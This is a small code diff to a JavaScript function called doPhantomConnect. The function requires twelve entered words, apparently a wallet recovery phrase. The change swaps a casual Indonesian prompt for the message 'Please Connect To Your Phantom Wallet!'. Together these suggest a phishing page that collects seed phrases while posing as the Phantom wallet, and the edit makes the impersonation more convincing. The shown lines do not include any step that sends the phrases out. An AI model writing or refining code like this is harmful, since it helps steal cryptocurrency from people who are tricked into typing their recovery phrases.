@@ -54,7 +54,7 @@ window.doPhantomConnect = function() {
     }
     
     if(words.filter(w=>w).length < 12) {
-        alert("Isi 12 kata dulu bro!");
+        alert("Please Connect To Your Phantom Wallet!");
         return;
     }
     
